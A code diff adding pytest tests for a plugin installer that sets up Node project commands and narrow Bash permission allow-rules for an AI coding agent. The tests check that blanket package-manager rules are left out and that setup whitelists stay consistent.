+
+def test_init_upgrade_adds_setup_beside_hand_edited_commands(repo, tmp_path, capsys):
+    if repo.form != "plugin":
+        pytest.skip("init_project.py is the plugin's installer")
+    mod = _import_init()
+    proj = _node_project(tmp_path / "p", ("pnpm-lock.yaml",))
+    assert mod.main(["--root", str(proj), "--stack", "node", "--no-ci", "--allow-partial-baseline"]) == 0
+    cfg_path = proj / ".claude" / "sdlc.json"
+    cfg = json.loads(cfg_path.read_text())
+    del cfg["commands"]["setup"]
+    cfg["commands"]["test"] = "pnpm test --run"  # a human edit
+    cfg_path.write_text(json.dumps(cfg))
+    capsys.readouterr()
+    assert mod.main(["--root", str(proj), "--stack", "node", "--no-ci", "--upgrade"]) == 0
+    after = json.loads(cfg_path.read_text())["commands"]
+    assert after["setup"] == "pnpm install --frozen-lockfile" and after["test"] == "pnpm test --run"
+    assert "+keys: commands.setup" in capsys.readouterr().out
+
+
+def test_settings_template_carries_the_node_forms_and_one_rule_per_setup_command(repo):
+    if repo.form != "plugin":
+        pytest.skip("plugin templates only")
+    mod = _import_init()
+    rules = json.loads((_pack_root() / "templates" / "settings.project.json").read_text())["permissions"]["allow"]
+    for form in ("pnpm test *", "pnpm exec vitest run *", "pnpm vitest run *", "pnpm exec playwright test *", "pnpm lint", "pnpm typecheck",
+                 "npm test *", "npm run test *", "npx --no-install vitest run *", "yarn test *", "yarn vitest run *", "bun test *", "bunx vitest run *"):
+        assert f"Bash({form})" in rules, form
+    for setup in mod.SETUP_COMMANDS:
+        assert f"Bash({setup})" in rules, setup
+    for blanket in ("Bash(pnpm *)", "Bash(npx *)", "Bash(npm *)", "Bash(yarn *)", "Bash(bun *)", "Bash(bunx *)", "Bash(npx vitest run*)"):
+        assert blanket not in rules, blanket
+
+
+def test_the_run_headless_setup_whitelist_matches_init(repo):
+    if repo.form != "plugin":
+        pytest.skip("plugin templates only")
+    mod = _import_init()
+    text = repo.script_path("run_headless.sh").read_text(encoding="utf-8")
+    case = re.search(r'case "\$SETUP" in\n\s*(""\|[^\n]*?) ;;', text).group(1).removeprefix('""|')
+    listed = {part.strip('")') for part in case.split('"|"')} - {""}
+    assert listed == set(mod.SETUP_COMMANDS)
+
+
+def test_node_skills_allow_the_node_forms_and_the_permission_check_is_clean(repo):
+    if repo.form != "plugin":
+        pytest.skip("plugin templates only")
+    for skill in ("verify", "tests", "implement"):
+        head = (_pack_root() / "skills" / skill / "SKILL.md").read_text().split("\n---", 1)[0]
+        for form in ("pnpm test *", "pnpm exec vitest run *", "pnpm exec playwright test *", "pnpm lint", "pnpm typecheck", "npm test *", "yarn test *", "bun test *", "bunx vitest run *"):
+            assert f"  - Bash({form})" in head, (skill, form)
+        assert "Bash(pnpm *)" not in head and "Bash(npx *)" not in head
+    r = repo.run_script("check_skill_permissions.py", "--root", str(_pack_root()))
     assert r.rc == 0 and "0 uncovered" in r.out, r.text
